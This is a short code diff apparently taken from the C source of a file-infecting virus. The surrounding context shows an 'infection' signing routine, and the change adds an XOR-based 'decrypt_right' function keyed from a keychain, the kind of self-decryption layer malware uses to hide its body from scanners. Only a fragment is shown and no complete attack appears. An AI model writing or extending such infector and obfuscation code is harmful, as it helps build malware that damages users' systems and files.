@@ -34,6 +34,12 @@ __attribute__((always_inline)) static inline void sign_infection(char *dst, cons
 	_memcpy(dst + (size + SIGNATURE_SIZE), end, 1);
 }
 
+__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+{
+	for (register size_t index = 0; index < size; index++)
+		callee[index] ^= keychain->key[RIGHT];
+}
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
